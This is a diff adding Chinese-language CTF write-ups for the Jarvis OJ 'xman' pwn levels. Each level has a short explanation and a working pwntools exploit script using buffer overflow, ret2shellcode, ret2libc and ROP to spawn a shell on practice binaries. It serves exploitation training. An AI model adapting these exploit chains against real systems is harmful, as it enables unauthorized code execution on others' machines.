@@ -1,0 +1,191 @@
+#### xman_level0
+
+考点：ret2text的基本利用
+解法：read函数溢出覆盖到后门函数
+
+```c
+#!/usr/bin/env python
+# -*- coding: utf-8 -*-
+from pwn import *
+
+# context(log_level="debug", arch="amd64", os="linux")
+p = process('./level0')
+# p = remote('pwn2.jarvisoj.com', 9881)
+elf = ELF('./level0', checksec=False)
+
+pd = 'a' * 0x88
+pd += p64(elf.sym['callsystem'])
+p.send(pd)
+p.recv()
+p.interactive()
+```
+
+#### xman_level1//ret2shellcode
+
+考点：ret2shellcode的基本利用
+解法：read函数溢出覆盖shellcode，ret时返回shellcode
+
+```c
+#!/usr/bin/env python
+# -*- coding: utf-8 -*-
+from pwn import *
+
+# context(log_level="debug", arch="i386", os="linux")
+p = process('./level1')
+# p = remote('pwn2.jarvisoj.com', 9877)
+elf = ELF('./level1', checksec=False)
+
+p.recvuntil("What's this:0x")
+addr_buf = int(p.recv(8), 16)
+
+pd = asm(shellcraft.sh())
+pd = pd.ljust(0x8c, 'a')
+pd += p32(addr_buf)
+p.send(pd)
+p.recv()
+p.interactive()
+```
+
+#### xman_level2
+
+考点：ret2syscall的基本利用
+解法：溢出覆盖ret返回system的plt地址，加一个字长的ret地址和binsh的地址
+
+```c
+#!/usr/bin/env python
+# -*- coding: utf-8 -*-
+from pwn import *
+
+# context(log_level="debug", arch="i386", os="linux")
+p = process('./level2')
+# p = remote('pwn2.jarvisoj.com', 9878)
+elf = ELF('./level2', checksec=False)
+
+plt_system = elf.plt['system']
+addr_bin_sh = 0x0804A024
+
+pd = 'a' * 0x8c
+pd += p32(plt_system)
+pd += p32(0)
+pd += p32(addr_bin_sh)
+p.sendafter('Input:\n', pd)
+p.interactive()
+```
+
+#### xman_level3
+
+考点：ret2libc的基本利用
+解法：溢出返回write的plt地址，先泄露write_got的地址，知道libc地址后，继续返回main函数触发溢出，这一次正常溢出返回system("/bin/sh")
+
+```c
+#!/usr/bin/env python
+# -*- coding: utf-8 -*-
+from pwn import *
+
+# context(log_level="debug", arch="i386", os="linux")
+p = process('./level3')
+# p = remote('pwn2.jarvisoj.com', 9879)
+elf = ELF('./level3', checksec=False)
+libc = ELF('./libc-2.19.so', checksec=False)
+
+plt_write = elf.plt['write']
+got_write = elf.got['write']
+addr_main = 0x08048484
+
+pd = 'a' * 0x8c
+pd += p32(plt_write)
+pd += p32(addr_main)
+pd += p32(1)
+pd += p32(got_write)
+pd += p32(4)
+p.sendafter('Input:\n', pd)
+
+addr_write = u32(p.recv(4))
+libcbase = addr_write - libc.sym['write']
+addr_system = libcbase + libc.sym['system']
+addr_bin_sh = libcbase + libc.search('/bin/sh').next()
+
+pd = 'a' * 0x8c
+pd += p32(addr_system)
+pd += p32(0)
+pd += p32(addr_bin_sh)
+p.sendafter('Input:\n', pd)
+p.interactive()
+```
+
+#### xman_level2_x64
+
+考点：64位程序的ret2syscall
+解法：64位的传参顺序是rdi, rsi, rdx, rcx, r8, r9;溢出返回gadget，布置rdi为binsh地址，然后布置system的plt地址，程序执行完毕得到shell
+
+```c
+#!/usr/bin/env python
+# -*- coding: utf-8 -*-
+from pwn import *
+
+# context(log_level="debug", arch="amd64", os="linux")
+p = process('./level2_x64')
+# p = remote('pwn2.jarvisoj.com', 9882)
+elf = ELF('./level2_x64', checksec=False)
+
+plt_system = elf.plt['system']
+addr_bin_sh = 0x600A90
+addr_rdi_ret = 0x4006b3  # pop rdi ; ret
+# gdb.attach(p, "b *0x40061E\nc")
+
+pd = 'a' * 0x88
+pd += p64(addr_rdi_ret)
+pd += p64(addr_bin_sh)
+pd += p64(plt_system)
+pd += p64(0xdeadbeef)
+p.sendafter('Input:\n', pd)
+p.interactive()
+```
+
+#### xman_level3_x64
+
+考点：64位程序的ret2libc
+解法：溢出返回gadget，布置rdi为1，rsi为write函数的got表地址，rdx为8，最后加上返回地址write的plt表地址和vulnerable函数的地址，接收到wirte的真实地址后算出libc地址，下一次溢出返回system("/bin/sh")
+
+```c
+#!/usr/bin/env python
+# -*- coding: utf-8 -*-
+from pwn import *
+
+# context(log_level="debug", arch="amd64", os="linux")
+p = process('./level3_x64')
+# p = remote('pwn2.jarvisoj.com', 9883)
+elf = ELF('./level3_x64', checksec=False)
+libc = ELF('./libc-2.19.so', checksec=False)
+got_write = elf.got['write']
+plt_write = elf.plt['write']
+addr_rdi_ret = 0x00000000004006b3  # pop rdi ; ret
+addr_rsi_r15_ret = 0x00000000004006b1  # pop rsi ; pop r15 ; ret
+addr_vulnerable_function = 0x00000000004005E6
+
+pd = 'a' * 0x88
+pd += p64(addr_rdi_ret)
+pd += p64(1)
+pd += p64(addr_rsi_r15_ret)
+pd += p64(got_write)
+pd += p64(8)
+pd += p64(plt_write)
+pd += p64(addr_vulnerable_function)
+p.sendafter('Input:\n', pd)
+
+addr_write = u64(p.recv(6).ljust(8, '\x00'))
+libcbase = addr_write - libc.sym['write']
+addr_system = libcbase + libc.sym['system']
+addr_bin_sh = libcbase + libc.search('/bin/sh').next()
+
+pd = 'a' * 0x88
+pd += p64(addr_rdi_ret)
+pd += p64(addr_bin_sh)
+pd += p64(addr_system)
+p.sendafter('Input:\n', pd)
+success('addr_write = ' + hex(addr_write))
+p.interactive()
+```
+
+
+
